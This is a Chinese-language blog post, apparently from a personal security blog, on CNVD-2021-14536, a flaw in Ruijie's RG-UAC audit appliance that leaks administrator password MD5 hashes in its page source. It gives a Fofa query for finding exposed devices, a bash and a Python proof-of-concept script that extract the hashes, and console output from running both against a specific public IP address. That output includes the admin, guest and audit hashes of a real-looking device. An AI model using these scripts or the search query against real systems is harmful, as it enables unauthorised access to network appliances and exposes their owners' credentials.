---
title: Ruijie_RG_UAC
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-03-08 15:36:33
top:
tags:
layout:
---
编写进度
- [x] 



## CNVD-2021-14536
锐捷RG-UAC统一上网行为管理审计系统存在信息泄漏，攻击者通过网页源代码可间接获取管理用户账户和密码的MD5值，解密后可登陆管理后台


[Fofa](https://fofa.so/)查询关键字 `title="RG-UAC登录页面" && body="admin"`

![锐捷登陆页面](../images/ruijie-1.jpg)
`Command+u`查看网页源码，`Command+f`搜索password即可看到密码的MD5

Burp数据包
![锐捷响应包](../images/ruijie-2.jpg)

进行解密即可

```zsh
❯ time ./Ruijie.sh https://61.191.151.185:4443/
admin: "password":"0e563b8ae893f8f78f943fd72f1425b8"
guest: "password":"fcf41657f02f88137a1bcf068a32c0a3"
audit: "password":"d33542b8458db8cabd9843fe7c1e8784"
./Ruijie.sh https://61.191.151.185:4443/  0.02s user 0.01s system 5% cpu 0.507 total

~ via 🐍 v2.7.16
❯ time ./Ruijie_get_passwd.py https://61.191.151.185:4443/
[o]Target:https://61.191.151.185:4443/
super_amdin's password of MD5: 0e563b8ae893f8f78f943fd72f1425b8
./Ruijie_get_passwd.py https://61.191.151.185:4443/  0.14s user 0.04s system 25% cpu 0.680 total

```

## POC-1 shell脚本
```zsh
# !/bin/bash
# File Name: Ruijie_get_password.sh
#
# Author: Mr.Frame
# Date: Mon Mar  8 16:10:52 CST 2021
# Description:
# CNVD-2021-14536 Ruijie 锐捷RG-UAC统一上网行为管理审计系统 

# 核心语句: awk -F "[,]"  'NR==148,/password/{print "admin: "$5 "\n"  "guest: " $20 "\n" "audit: " $35 }'  aa.txt

Resp=$(mktemp)

curl -k -sS "$1" >> $Resp

awk -F "[,]"  'NR==148,/password/{print "admin: "$5 "\n"  "guest: " $20 "\n" "audit: " $35 }'  $Resp

rm $Resp
```

## POC-2 python脚本
```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 2021-03-12
# Author: Mr.Frame 
# Description:
#      CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 
#Usage:
#      python3 ruijie_get_passwd  <url>

import requests
import urllib3
import re

def Ruijie_get_passwd(url):
    "Check CNVD-2021-14536 of Target"
    url=url
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
    }

    
    urllib3.disable_warnings() # 关闭ssl警告
    try:
        
        response=requests.get(url=url,headers=headers,verify=False,timeout=2)
    except Exception as e:
        print("\033[31m[x]Connection failed\033[0m")
        print(e.__str__())

    if response.status_code == 200 and "super_admin" in response.text and "password" in response.text:
            password=(re.search('[a-fA-F0-9]{32}', response.text)).group()
            print("\033[32m[o]Target:{}\033[0m \nsuper_amdin's password of MD5: \033[31m{}\033[0m".format(url,password))
    else:
        print("\033[32mtarget:{} is safe\033[0m")


if __name__ == '__main__':
    import sys
    if sys.argv.__len__() != 2:
        print("python3 ruijie_get_passwd  https://x.x.x.x:<port>")
    else:
        Ruijie_get_passwd(sys.argv[1])

```






参考：
[CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 ](https://mp.weixin.qq.com/s/4Lx3N1yOrFQbySzIuVjRcQ)
